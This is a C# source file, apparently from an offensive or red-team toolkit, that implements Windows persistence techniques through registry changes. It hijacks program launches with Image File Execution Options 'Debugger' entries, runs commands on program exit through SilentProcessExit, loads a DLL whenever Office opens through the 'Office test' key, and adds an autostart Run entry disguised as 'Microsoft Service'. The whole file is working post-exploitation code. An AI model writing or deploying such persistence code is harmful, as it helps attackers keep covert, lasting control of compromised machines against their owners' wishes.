using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Persistence
{
    internal class Persistence
    {
        private RegistryKey registryKey = Registry.LocalMachine;

        /// <summary>
        /// Interception of the closure of a certain program and execution of commands at this event
        /// Privileges: Admin
        /// </summary>
        /// <param name="programName">A program whose closure needs to be monitored</param>
        /// <param name="commandToExecute">The command that should be executed</param>
        public void GFlags(string programName, string commandToExecute)
        {
            var subkey = registryKey.OpenSubKey(@$"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\{programName}",
                                                      true);
            ArgumentNullException.ThrowIfNull(subkey);
            subkey.SetValue("GlobalFlag", "512", RegistryValueKind.DWord);
            subkey = registryKey.OpenSubKey(@$"Software\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\{programName}",
                                                    true);
            ArgumentNullException.ThrowIfNull(subkey);
            subkey.SetValue("ReportingMode", "1", RegistryValueKind.DWord);
            subkey.SetValue("MonitorProcess", commandToExecute);

            // subkey.SetValue("MonitorProcess", "");
        }

        /// <summary>
        /// Replace the program that will be executed instead of another
        /// </summary>
        /// <param name="programName">A program whose closure needs to be monitored</param>
        /// <param name="commandToExecute">The command that should be executed</param>
        public void ReplaceProgram(string programName, string commandToExecute)
        {
            //var subkey = registryKey.OpenSubKey(@$"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\{programName}",
            //                  true);
            //ArgumentNullException.ThrowIfNull(subkey);
            var subKey = WindowsRegistry.OpenLocalMachineKey(@$"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\{programName}");
            subKey.SetValue("Debugger", $"cmd /C {commandToExecute}", RegistryValueKind.String);

            // subkey.DeleteValue("Debugger");
        }
        
        /// <summary>
        /// Running the command after closing the program
        /// </summary>
        /// <param name="programName">A program whose closure needs to be monitored</param>
        /// <param name="commandToExecute">The command that should be executed</param>
        public void ExecProgAndCommand(string programName, string commandToExecute)
        {
            var pathToFile = Utils.FindFile(programName);
            var newName = "_" + Path.GetFileName(pathToFile);
            var newPathToFile = Path.Combine(pathToFile.Replace(Path.GetFileName(pathToFile), String.Empty), newName);

            if (File.Exists(newPathToFile))
                File.Delete(newPathToFile);

            File.Copy(pathToFile, newPathToFile);

            var subkey = registryKey.OpenSubKey(@$"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\{programName}",
                                          true);
            ArgumentNullException.ThrowIfNull(subkey);
            subkey.SetValue("Debugger", @$"cmd /C {newName} & {commandToExecute}", RegistryValueKind.String);

            // subkey.DeleteValue("Debugger");
        }


        /// <summary>
        /// Execution of commands when a some program from Office pack opens
        /// </summary>
        /// <param name="pathToDll">A dll file that should be executed</param>
        public void ExecCommandOnOfficeOpening(string pathToDll)
        {
            RegistryKey registryKey = Registry.CurrentUser;
            registryKey.CreateSubKey(@$"Software\Microsoft\Office test\Special\Perf", true);
            var subKey = registryKey.OpenSubKey(@$"Software\Microsoft\Office test\Special\Perf", true);
            ArgumentNullException.ThrowIfNull(subKey);

            // Set Default Value
            subKey.SetValue("", pathToDll, RegistryValueKind.String);
        }

        /// <summary>
        /// Exec exe on startup
        /// </summary>
        /// <param name="pathToExe">An exe file that should be executed</param>
        public void ExecOnStartup(string pathToExe)
        {
            //registryKey = Registry.CurrentUser;
            //var subKey = registryKey.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);
            // ArgumentNullException.ThrowIfNull(subKey);
            var subKey = WindowsRegistry.OpenCurrentUserKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run");
            subKey.SetValue("Microsoft Service", @$"{pathToExe}", RegistryValueKind.String);
        }
    }
}
